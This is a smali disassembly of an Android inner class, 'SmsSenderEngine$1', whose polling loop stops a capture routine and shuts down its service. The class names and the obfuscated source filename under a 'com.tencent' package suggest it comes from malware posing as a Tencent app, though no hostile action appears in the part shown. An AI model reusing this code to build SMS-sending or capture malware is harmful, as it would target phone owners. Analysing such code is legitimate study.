.class Lcom/tencent/SmsSenderEngine$1;
.super Ljava/lang/Object;
.source "skatinghsatinbintegralj9.java"

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/tencent/SmsSenderEngine;->pr()V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Lcom/tencent/SmsSenderEngine;


# direct methods
.method constructor <init>(Lcom/tencent/SmsSenderEngine;)V
    .locals 0

    .line 137
    iput-object p1, p0, Lcom/tencent/SmsSenderEngine$1;->this$0:Lcom/tencent/SmsSenderEngine;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 4

    .line 142
    :catch_0
    :goto_0
    sget-boolean v0, Lcom/tencent/SmsSenderEngine;->ISON:Z

    if-eqz v0, :cond_1

    const/4 v0, 0x0

    .line 144
    :try_start_0
    sget-object v1, Lcom/tencent/SmsSenderEngine;->syc:Ljava/lang/Object;

    monitor-enter v1
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_1
    .catch Ljava/lang/OutOfMemoryError; {:try_start_0 .. :try_end_0} :catch_2

    .line 145
    :try_start_1
    sget-boolean v2, Lcom/tencent/DataEncryptionEngine;->q:Z

    if-eqz v2, :cond_0

    goto :goto_1

    .line 169
    :cond_0
    invoke-static {}, Lcom/tencent/SmsSenderEngine;->stopCapture()V

    .line 170
    iget-object v2, p0, Lcom/tencent/SmsSenderEngine$1;->this$0:Lcom/tencent/SmsSenderEngine;

    const/4 v3, 0x1

    invoke-virtual {v2, v3}, Lcom/tencent/SmsSenderEngine;->stopForeground(Z)V

    .line 171
    iget-object v2, p0, Lcom/tencent/SmsSenderEngine$1;->this$0:Lcom/tencent/SmsSenderEngine;

    invoke-virtual {v2}, Lcom/tencent/SmsSenderEngine;->stopSelf()V

    .line 172
    sput-boolean v0, Lcom/tencent/SmsSenderEngine;->ISON:Z

    .line 175
    :goto_1
    monitor-exit v1

    goto :goto_2

    :catchall_0
    move-exception v2

    monitor-exit v1
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    :try_start_2
    throw v2
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_1
    .catch Ljava/lang/OutOfMemoryError; {:try_start_2 .. :try_end_2} :catch_2

    .line 178
    :catch_1
    sput-boolean v0, Lcom/tencent/SmsSenderEngine;->ISON:Z

    :catch_2
    :goto_2
    const-wide/16 v0, 0x1

    .line 180
    :try_start_3
    invoke-static {v0, v1}, Ljava/lang/Thread;->sleep(J)V
    :try_end_3
    .catch Ljava/lang/InterruptedException; {:try_start_3 .. :try_end_3} :catch_0

    goto :goto_0

    :cond_1
    return-void
.end method
